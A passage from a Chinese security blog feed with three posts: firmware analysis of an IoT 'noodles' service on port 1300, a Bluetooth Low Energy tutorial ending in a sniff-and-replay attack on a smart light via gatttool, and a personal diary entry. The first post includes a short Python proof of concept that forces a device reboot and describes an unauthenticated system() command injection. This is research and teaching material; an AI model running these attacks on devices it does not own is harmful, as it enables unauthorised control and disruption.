id="noodles服务分析"><a href="#noodles服务分析" class="headerlink" title="noodles服务分析"></a>noodles服务分析</h2><p>通过分析发现noodles监听了1300端口</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><blockquote><p>sudo chroot . .&#x2F;qemu-arm-static .&#x2F;usr&#x2F;bin&#x2F;noodles</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220825143728754.png" alt="image-20220825143728754"></p><p>可以使用nmap来查看是否监听1300</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/image-20220825143906273.png" alt="image-20220825143906273"></p><p>可以看到1300端口已开放，并且noodles也对nmap有反应了</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>对于程序的静态分析，可以从main函数来正向递进分析，也可以从一些字符串来分析，又或者从一些关键函数</p><p>这里通过nmap扫描时noodles的打印来查找</p><p>通过交叉引用发现在FUN_00011878函数中存在相关信息。</p><p>创建并监听1300端口</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108367.png" alt="image-20220825152959870"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108369.png" alt="image-20220825154343089"></p><p>等待用户连接</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108456.png" alt="image-20220825153205132"></p><p>获取client传进来的内容</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108183.png" alt="image-20220825153844262"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108672.png" alt="image-20220825154440079"></p><p>主要内容处理在下面相似的内容处</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108224.png" alt="image-20220825155349794"></p><p>1300端口大概做了这些事情</p><p>参数有一下几种</p><blockquote><p>UPGRADE</p><p>BURNMAC</p><p>ELFEXEC</p><p>SYSTEM</p><p>SYSTEMEX</p><p>DOWNLOAD</p><p>UPLOAD</p><p>FLASHDUMP</p><p>BURNSN</p><p>READSN</p><p>WRITEENV</p><p>READENV</p></blockquote><h4 id="fun-00014f90-函数"><a href="#fun-00014f90-函数" class="headerlink" title="fun_00014f90()函数"></a>fun_00014f90()函数</h4><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108708.png" alt="image-20220826095918427"></p><p>三个参数分别为从client传入的内容，字符串，0</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108283.png" alt="image-20220826101125979"></p><p>这里是xml参数处理。</p><h3 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h3><p>这里出了一个代码注入和一个设备重启</p><h4 id="设备重启"><a href="#设备重启" class="headerlink" title="设备重启"></a>设备重启</h4><p>设备重启是利用了代码问题，更像是设计时不严谨导致的</p><p>当标签中含有upgrade时，会运行到FUN_000146f4函数，执行完毕后必然会执行到FUN_00016b90函数来使设备重启。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108749.png" alt="image-20220826093937746"></p><p>只需要运行到此处，脚本会使设备重启</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108256.png" alt="image-20220826093948721"></p><p>poc</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> times = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">1300</span>))s.send(<span class="hljs-string">&quot;&lt;UPGRADE&gt;test&lt;/UPGRADE&gt;&quot;</span>.encode())<span class="hljs-built_in">print</span>(s.recv(<span class="hljs-number">1024</span>))s.close()</code></pre></div><h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><p>这里更像一个后门，直接在 FUN_000140b4函数中发现，如果<code>&lt;system&gt;&lt;/system&gt;</code>中的参数不是iwlist便会直接使用system执行</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301301108353.png" alt="image-20220826095120280"></p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>协议-低功耗蓝牙协议(BLE)</title>
    <link href="/article/94a01627.html"/>
    <url>/article/94a01627.html</url>
    
    <content type="html"><![CDATA[<h1 id="蓝牙"><a href="#蓝牙" class="headerlink" title="蓝牙"></a>蓝牙</h1><p>蓝牙是一种近距离无线通信技术，运行在2.4GHz免费频段，目前已大量应用于各种移动终端，物联网，健康医疗，智能家居等行业。</p><p>低功耗蓝牙协议是由蓝牙技术联盟（Bluetooth SIG）在2010年发布的蓝牙4.0，并不是蓝牙3.0的升级，而是全新的技术架构。</p><p>蓝牙4.0版本分为两种模式，单模蓝牙和双模蓝牙。</p><p>双模蓝牙，支持低功耗蓝牙的同时还兼容经典蓝牙，经典蓝牙的特点是大数据高速率，例如音频、视频等数据传输，常见的蓝牙音箱就是双模蓝牙，他需要大量的音频数据传输。</p><p>单模蓝牙，即低功耗蓝牙模式，是蓝牙4.0中的重点技术，低功耗，快连接，长距离。像各种手环，蓝牙温度计等都属于单模蓝牙。</p><h1 id="低功耗蓝牙"><a href="#低功耗蓝牙" class="headerlink" title="低功耗蓝牙"></a>低功耗蓝牙</h1><p>目前低功耗蓝牙在移动终端，智能家居，互联设备等市场都有广泛应用。</p><p>其优点：</p><ul><li>低功耗，使用纽扣电池就可以运行数月至数年。</li><li>快连接，毫秒级的连接速度，传统蓝牙甚至长达数分钟。</li><li>远距离，长达数百米的通信距离，而传统蓝牙通常10米左右。</li></ul><p>蓝牙联盟为低功耗蓝牙定义了一些标准数据规范（profile），只要遵守该规范，任意厂家的蓝牙设备，均可以相互连接与通信，例如无线蓝牙键盘鼠标，无论是安卓或是iOS还是Windows，均是即插即用，这便是“标准”的力量。</p><p>低功耗蓝牙支持的标准Profile有：</p><ul><li>HID，用于无线鼠标，键盘或其他遥控设备。</li><li>BatteryServices，电池状态服务，用于告知电池电量状态。</li><li>HRP，心率计Profile，用于心率采集。等等。</li></ul><p>低功耗蓝牙还可以自定义Profile，伴随着智能手机的发展和普及，低功耗蓝牙的这个特性得到了发扬光大，同时也拓宽了低功耗蓝牙的应用领域。例如，可以自定义一个开关量的Profile，数据01表示开灯，数据00表示关灯，然后手机发送数据01和00就可以控制灯的亮和灭。</p><p>类似的应用案例有很多，下面总结应用特点：</p><ul><li>支持自定义Profile，可以收发任意格式的数据，如01和00。</li><li>支持自定义设备，支持任意设备的连接和通信，例如智能蓝牙插座等。</li></ul><h1 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h1><p>以下将低功耗蓝牙统称为BLE，低功耗蓝牙设备称为BLE设备。</p><h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><p>BLE设备角色主要分为两种角色，<code>主机（Master）</code>和<code>从机（Peripheral）</code>，当主机和从机建立连接之后才能相互收发数据。</p><ul><li>主机，主机可以发起对从机的扫描连接。例如手机，通常作为BLE的主机设备。</li><li>从机，从机只能广播并等待主机的连接。例如智能手环，是作为BLE的从机设备。</li></ul><p>另外还有<code>观察者（Observer）</code>和<code>广播者（Broadcaster）</code>，这两种角色不常使用，但也十分有用，例如苹果的iBeacon，就是使用广播者角色来做，只需要广播特定内容即可。</p><blockquote><p>iBeacon，苹果公司开发的一种通过低功耗蓝牙技术进行一个十分精确的微定位技术;</p></blockquote><ul><li>观察者，观察者角色监听空中的广播事件，和主机唯一的区别是不能发起连接，只能持续扫描从机。</li><li>广播者，广播者可以持续广播信息，和从机的唯一区别是不能被主机连接，只能广播数据</li></ul><p>蓝牙协议栈没有限制设备的角色范围，同一个BLE设备，可以作为主机，也可以作为从机，我们称之为主从一体，主从一体的好处是，每个BLE设备都是对等的，可以发起连接，也可以被别人连接，更加实用。</p><h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><p>一个智能手环，在绑定之前，需要让手机发现自己才能去进行绑定操作。</p><p>这个让手机发现自己的操作就叫做广播。</p><p>即从机每经过一个时间间隔发送一次<code>广播数据包</code>，这个时间间隔称为<code>广播间隔</code>，这个广播动作叫做<code>广播事件</code>，只有当从机处于广播状态时，主机才能发现该从机。</p><p>BLE设备拥有40个信道，从0到39，其中37，38，39就是BLE的广播信道。</p><p>在每个广播事件中，广播包会分别在37,38和39三个信道上依次广播。</p><p>广播时间间隔的范围是从20ms到10.24s，广播间隔影响建立连接的时间。广播间隔越大，连接的时间越长。</p><p>广播数据包最多能携带31个字节的数据，一般包含可读的设备名称，设备是否可连接等信息。</p><p>当主机收到从机广播的数据包后，它可以再发送获取更多数据包的请求，这个时候从机将广播<code>扫描回应</code>数据包，扫描回应数据包和广播包一样，可以携带31个字节的数据，如果长度不足，会补0，这部分数据无意义。</p><blockquote><p>提示：蓝牙4.x，广播有效载荷最多是31个字节。而在蓝牙5.0中，通过添加额外的广播信道和新的广播PDU，将有效载荷增加到了255个字节</p></blockquote><p>在安卓手机中可以使用BLE调试助手来查看广播包。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111025384.jpg" alt="0A3834EF258FD440B5A62DAF533A5AB9"></p><p>广播包一般格式为 0x长度类型数据长度类型数据…</p><p>0x02011A05030F1892FD11094544494649455220545753312050726F</p><p>这是我附近某个耳机的广播信息。</p><p>分析：</p><ul><li>0x02&#x2F;01&#x2F;1A05，长度2&#x2F;类型&#x2F;对应长度的值。</li><li>0x03&#x2F;0F&#x2F;1892FD，长度3&#x2F;类型&#x2F;对应长度的值。</li><li>0x11&#x2F;09&#x2F;4544494649455220545753312050726F，长度16&#x2F;类型&#x2F;对应的值。</li></ul><p>前两段数据并不能看出什么信息，第三段数据可以转为ascii看一下。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026149.png" alt="image-20230106111344806"></p><p>即蓝牙耳机名字。</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>扫描是主机监听从机广播数据包和发送扫描请求的过程，主机通过扫描，可以获取到从机的广播包以及扫描回应数据包，主机可以对已扫描到的从机设备发起连接请求，从而连接从机设备并通信。</p><p>扫描动作有两个比较重要的时间参数：<code>扫描窗口</code>和<code>扫描间隔</code>，如果扫描窗口等于扫描间隔，那么主机将一直处于扫描状态之中，持续监听从机广播包。</p><p><a href="http://doc.iotxx.com/%E6%96%87%E4%BB%B6:BLE%E6%8A%80%E6%9C%AF_%E6%89%AB%E6%8F%8F%E7%AA%97%E5%8F%A3%E5%92%8C%E6%89%AB%E6%8F%8F%E9%97%B4%E9%9A%94.jpg"><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026362.jpg" alt="BLE技术 扫描窗口和扫描间隔.jpg"></a></p><ul><li>被动扫描，主机监听广播信道的数据，当接收到广播包时，协议栈将向上层（也就是应用层，用户可编程）传递广播包。</li><li>主动扫描，主动扫描除了完成被动扫描的动作外，还会向从机发送一个扫描请求，从机收到该请求时，会再次发送一个称作<code>扫描回应</code>的广播包。</li></ul><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>除了扫描， 设备也可以主动发起连接， 发起状态的设备和扫描状态的设备区别在于：当它监听到一个可连接的广播， 发起设备就会发送一个连接请求， 而扫描设备会发送一个扫描请求。连接请求包括一套为从设备准备的连接参数， 安排连接期间发生的通道和时间。如果广播设备接收了连接， 两个设备会进入连接状态， 发起方会称为 Master（主机），而广播方会称为 Slave（从机）。</p><p>所有的通信都发生在两个设备的连接事件期间， 连接事件周期的发生， 按照连接参数指定的间隔联系， 每个事件发生在某个数据通道（0~36）， 调频增量参数决定了下次连接时间发生的通道， 在每个连接时间期间， Master 先发送， Slave 会在 150us 之后做出回应， 即使一个连接事件发生（ 或两者）， 双方都没有数据发送（例外情况是从设备潜伏使能）， 这允许两个设备都承认对方仍然存在并保持活跃的连接。</p><p>主机和从机都可以主动断开连接。一边发起断开， 另一边必须在断开连接之前回应这个断开请求。</p><h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><p>BLE 通信的两个基本概念。</p><ul><li><strong>GAP</strong> 通用访问配置文件(Generic Access Profile)</li><li><strong>GATT</strong> 通用属性配置文件(Generic Attribute Protocol)</li></ul><p>GAP完成了上面广播，连接的操作。</p><p>GATT则定义了两个 BLE 设备连接后如何使用服务和属性两个概念进行数据交换。</p><p>GATT 的两个主要概念：</p><ul><li>服务（Services）</li><li>特征（Characteristics）</li></ul><p><code>Profile</code>包含一个或者多个<code>服务</code>，每个<code>服务</code>又包含一个或者多个<code>特征</code>。主机可以发现和获取从机的<code>服务</code>和<code>特征</code>，然后与之通信。<code>特征</code>是主从通信的最小单元。</p><p>每个服务和特征都有自己的唯一标识<code>UUID</code>，标准UUID为128位，蓝牙协议栈中一般采用16位，也就是两个字节的UUID格式。</p><p>每个特征都有自己的属性，属性的取值有：<code>可读 Read</code>，<code>可写 Write</code> 以及 <code>通知 Notify</code>。</p><p>这样，两个BLE设备就有以下的数据交互方式。</p><ul><li>主机可主动向从机Write写入或Read读取数据。</li><li>从机可主动向主机Notify通知数据。</li></ul><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>这里使用了两台手机来模拟两个BLE设备</p><p>从机：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026174.png" alt="image-20230109174401933"></p><p>主机连接从机：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026650.png" alt="Screenshot_20230110-143857"></p><p>上面链接后可以看到整个profile，下面每个UUID对应一个服务，不同服务之间有不同的特征。在UUID为 0xFFF0的服务中，有三个特征，0xFFF1，0xFFF2，0xFFF3。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026460.png" alt="image-20230111094129656"></p><p>可以看到FFF1的属性为read&#x2F;notify，可读，通知。FFF2的属性为Write，可写。</p><p>从机页面中，从机通过0xfff1发送数据。0xfff2接收数据。</p><h3 id="0xfff1"><a href="#0xfff1" class="headerlink" title="0xfff1"></a>0xfff1</h3><p>从机发送数据：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111026344.png" alt="image-20230111094259820"></p><p>主机实时接收:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027574.png" alt="image-20230111094737409"></p><h3 id="0xfff2"><a href="#0xfff2" class="headerlink" title="0xfff2"></a>0xfff2</h3><p>主机发送数据：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027280.png" alt="image-20230111095031034"></p><p>从机实时接收：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027889.png" alt="image-20230111095106285"></p><h1 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h1><p>可以理解为利用窃听装置来获取双方通信内容。</p><p>ble设备功能设计中，一定会少不了私有的Service或Characteristic，就要通过app逆向或嗅探蓝牙通信来分析了。</p><p>蓝牙嗅探最好的神器是Ubertooth One，精致的硬件＋配套的软件变成了物联网黑客强大的帮手。</p><blockquote><p>这玩意挺贵的，贵不是他的缺点，是我的缺点。</p></blockquote><p>所以我们使用暂时使用廉价的替代方案，BLE USB Dongle。之后有设备后会配套更新相应文章。</p><blockquote><p>这玩意只支持ble</p></blockquote><p>这里使用的是一块nRF52832 Dongle，某宝可以直接买到烧录好的板子，具体烧录过程就不赘述。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111046396.jpg" alt="image-20230111104642738"></p><p>具体可看官方文档：<a href="https://www.nordicsemi.com/Products">https://www.nordicsemi.com/Products</a></p><h2 id="配置wireshark"><a href="#配置wireshark" class="headerlink" title="配置wireshark"></a>配置wireshark</h2><p>购买板子后找客服要来物料包，其中包含相关插件。</p><p>打开 wireshark → 帮助 → 关于 wireshark → 文件夹 → 双击打开 Extcap 路径(全 局路径和个人路径二选其一)如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027258.png" alt="image-20230111101431156"></p><p>将 extcap 文件夹的四个文件复制到 wireshark 的 extcap 路径下， 以全局路径为例，如图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027128.png" alt="image-20230111101537140"></p><p>双击 wireshark 个人配置的路径，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027355.png" alt="image-20230111101655494"></p><p>在弹出的文件夹中打开 profiles 文件夹</p><p>将解压压缩包的 Profile_nRF_Sniffer_xx_xx 文件夹拷贝到 profiles 文件夹中，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027834.png" alt="image-20230111101728559"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>软件配置成功后，将设备 插入 USB 口连接至 PC 端，打开 Wireshark，选 择 nRF sniffer COMx，具体串口号根据实际选择。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111027932.png" alt="image-20230111101925074"></p><p>在工具栏中选择 → 视图 → 接口工具栏 → nRF sniffer，会出现如下界面(默认抓取 所有 BLE 广播信号):</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028268.png" alt="image-20230111101959670"></p><p>选择任一 BLE 从机上电进行广播。 </p><p>抓取指定 MAC 地址设备的数据包。</p><p>可通过 APP 查看设备 MAC 地址，如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028533.png" alt="image-20230111102043707"></p><p>如下图红色方框中所示，点击 devices 过滤下拉框选择对应 MAC 地址的 device，选择 固定设备后则只会抓取和该设备有关的数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028931.png" alt="image-20230111102101560"></p><p>Wireshark 选择该 MAC 地址设备后，该设备的广播包、scan request packet 和 scan response packet 都会被捕获到。</p><p>![image-20230111102119282](&#x2F;Users&#x2F;pipi&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230111102119282.png)</p><p>该设备与任意 master 通信的数据包都可以被抓取，包括连接过程和连接之后的数据 包。双击任意一个 packet 可查看具体内容，例如该设备广播包抓取内容如下:</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111028239.png" alt="image-20230111102137695"></p><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>其实是对一个简单的蓝牙氛围灯的嗅探与攻击，其功能比较简单且无数据加密。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111052210.jpg" alt="image-20230111105207086"></p><p>app长这样</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111144377.jpeg" alt="IMG_2E60123242CF-1"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111144425.jpeg" alt="IMG_82B5E06A322C-1"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>使用wireshark来嗅探相关信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111111065.png" alt="image-20230111111111938"></p><p>使用手机app连接灯。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111116973.png" alt="image-20230111111617864"></p><p>有很多Empty PDU空包，使用  !(btle.data_header.llid &#x3D;&#x3D; 0x1) 来过滤</p><h3 id="开关"><a href="#开关" class="headerlink" title="开关"></a>开关</h3><p>从手机发送打开命令</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111123878.png" alt="image-20230111112358755"></p><p>其对0x000e特征发送了bc01010155</p><p>关闭命令</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111126880.png" alt="image-20230111112654746"></p><p>对0x000e特征发送了bc01010055</p><p>通过对比，第5位的01&#x2F;00控制灯的打开和关闭。</p><h3 id="改变速度"><a href="#改变速度" class="headerlink" title="改变速度"></a>改变速度</h3><p>该灯可以调节灯块闪烁速度。从0-100</p><p>修改为0</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111132736.png" alt="image-20230111113239663"></p><p>修改为100</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111138001.png" alt="image-20230111113830782"></p><p>对比第四位从00-64转换为10进制，即0-100</p><p>所以通过修改该参数可控制速度。</p><p>bc0801 00 55</p><h3 id="改变灵敏度"><a href="#改变灵敏度" class="headerlink" title="改变灵敏度"></a>改变灵敏度</h3><p>与速度类似</p><p>修改为0</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111145004.png" alt="image-20230111114518816"></p><p>修改为100</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111145706.png" alt="image-20230111114553528"></p><p>特征与速度类似</p><h3 id="改变模式"><a href="#改变模式" class="headerlink" title="改变模式"></a>改变模式</h3><p>第一个模式</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111147071.png" alt="image-20230111114710947"></p><p>最后一个模式</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111147434.png" alt="image-20230111114739307"></p><p>所以模式从01-99共153个。</p><p>bc060200 01 55</p><h3 id="改变颜色"><a href="#改变颜色" class="headerlink" title="改变颜色"></a>改变颜色</h3><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111150198.png" alt="image-20230111115025067"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111151788.png" alt="image-20230111115131681"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111152383.png" alt="image-20230111115200253"></p><p>通过对多个颜色的分析，数据格式应该为bc04060 11c 0 196 000055，其中11c控制亮度，196控制颜色。</p><p>通过上面的分析，发现都是通过0x000e来进行操作。</p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>这里利用linux蓝牙栈（blueZ）来操作。</p><blockquote><p>sudo apt-get install bluez</p></blockquote><p>安装完成后会有hcitool和gatttool两个工具，分别进行扫描和连接以及数据的读写。</p><p>硬件使用一个蓝牙4.0的免驱适配器。</p><p>如果你的电脑虚拟机无法获取到主机网卡，可以在vm设置中取消与linux共享蓝牙设备，再接入外接适配器。</p><h2 id="hciconfig"><a href="#hciconfig" class="headerlink" title="hciconfig"></a>hciconfig</h2><p>用于配置蓝牙设备。我们可以运行这个命令来列出连接到我们计算机的 BLE 适配器以及它们的基本信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111406103.png" alt="image-20230111140645973"></p><p>hciconfig hciX up 启用名为 hciX 的蓝牙设备</p><p>hciconfig hciX down 停用名为 hciX 的蓝牙设备</p><p>如果之后扫描和连接过程中出现什么问题，可以通过这两条命令来重启蓝牙设备尝试解决。</p><h2 id="hcitool"><a href="#hcitool" class="headerlink" title="hcitool"></a>hcitool</h2><p>hcitool 用于配置蓝牙连接，并向蓝牙设备发送一些特殊命令。</p><p>hcitool -i hciX 使用 hciX 接口，如果不指定，默认使用第一个可用接口。</p><p>hcitool scan 扫描处于发现模式的传统蓝牙设备。</p><p>hcitool lescan 扫描 BLE 设备。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111433751.png"></p><h3 id="Gattool"><a href="#Gattool" class="headerlink" title="Gattool"></a>Gattool</h3><p>gatttool -I 以交互模式启动 gatttool。</p><p>gatttool -t random -b [adr] -I 使用随机 LE 地址在交互模式下启动 gattool。连接到地址为 adr 的远程蓝牙设备。</p><p>primary 检查已连接 BLE 设备的可用服务。</p><p>characteristic 检查已连接 BLE 设备的可用属性，以便从中读取数据。</p><p>char-desc 特征描述符的发现。检查 n 个 handle。</p><p>char-read-hnd 使用 handle 读取属性 。</p><p>char-write-req 向 handle 写入值。</p><p>通过扫描获取的灯泡mac地址ff:22:09:30:00:18</p><p>使用<code>gatttool</code>连接</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111435279.png" alt="image-20230111143500095"></p><p>有时候连接成功了但是会报错，需要再连接下。</p><p>使用<code>primary</code>查看服务</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111436532.png" alt="image-20230111143606390"></p><p>使用<code>Characteristics</code>查看特征</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111437647.png" alt="image-20230111143704457"></p><p>在找到服务和特征后，需要知道读&#x2F;写数据的 handle。这可以使用<code>char-desc</code>命令得到。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111437233.png" alt="image-20230111143742105"></p><p>在找到 handle 后，使用命令<code>char-read-hnd &lt;handle&gt;</code>从 handle 中读取数据。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111439744.png" alt="image-20230111143910570"></p><p>也可以使用<code>char-read-uuid &lt;uuid&gt;</code>来读取。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111440241.png" alt="image-20230111144016084"></p><p>从前面嗅探中可知，该灯是通过0x000e来写入数据。</p><p>可以命令<code>char-write-req &lt;handle&gt; &lt;value&gt;</code> 向 handle 中写入值。</p><p>关机：</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image@main/202301111443278.png" alt="image-20230111144300103"></p><p>如果<code>char-write-req</code>报错，可以使用<code>char-write-cmd</code>替换。</p><p>不过注意cmd是没有返回内容的，只能从设备反应来查看是否执行成功。</p><hr><p>以上就是入门BLE协议的相关知识，关与协议的工具，有个比较强的大的框架mirage，不过相关文章很少，需要自行研究。</p><blockquote><p><a href="https://github.com/RCayre/mirage">https://github.com/RCayre/mirage</a></p></blockquote><p>之后也会尝试更多相关设备的研究。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>碎碎念</title>
    <link href="/article/f3404829.html"/>
    <url>/article/f3404829.html</url>
    
    <content type="html"><![CDATA[<p>终于要下雨了，孩子要热死了</p><p>什么都不想干，当个废物多好</p><p>今天看到一段话</p><div class="code-wrapper"><pre><code class="hljs">今天37度，我坐在便利店门口抽着烟，看着对面青春飞扬的初中生中考，我才发现我已经离开校园很多年了。可是很奇怪，好像校园青春就在昨天，仿佛天边的云伸手就能摸到。 还是书读得少了，想感慨青春易逝也没感慨出来。只记起陶渊明的一句诗“忆我少壮时，无乐自欣愉。”青春真是充满了力量和脆弱。</code></pre></div><p>今天的壁纸</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/IMG_0108.JPG" alt="IMG_0108"></p><p>杭州一行，玩是没玩明白，倒是回来拉两天肚子，再也不参加这种活动了。</p><p>这次的一些照片。</p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c.jpeg" alt="ADEEC1E9-BE7F-45B4-A7B8-1046A2827823_1_105_c"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&bo=VQhABlUIQAYWECA!&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=HAtABhwLQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=6b61c2a62bf63dc060101c4cca092e03&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4c692d47afb812c710204fd646c7b6c7&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=WglABloJQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f340e733aa99e0602f33cfb08e3d7400&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=9cf2b2c0b805d5413d4832e9eb42bb0c&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=f990c2901268e23184d685220f13f256&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=4fda3896c763b8cce7b3abe711690e43&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VQhABlUIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=5d8305503f754517af9f7db63188908e&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=VAY4BFQGOAQWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=b6fbe529def626514d856cc1c34fda63&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/p1yang/image/b&ek=1&kp=1&pt=0&bo=jAhABowIQAYWECA!&tl=1&vuin=397712823&tm=1656925200&dis_t=1656926146&dis_k=cc711e8ed9decbff7c171c8aa071f5ca&sce=50-1-1&rf=viewer_311&t=5" alt="img"></p><p><img 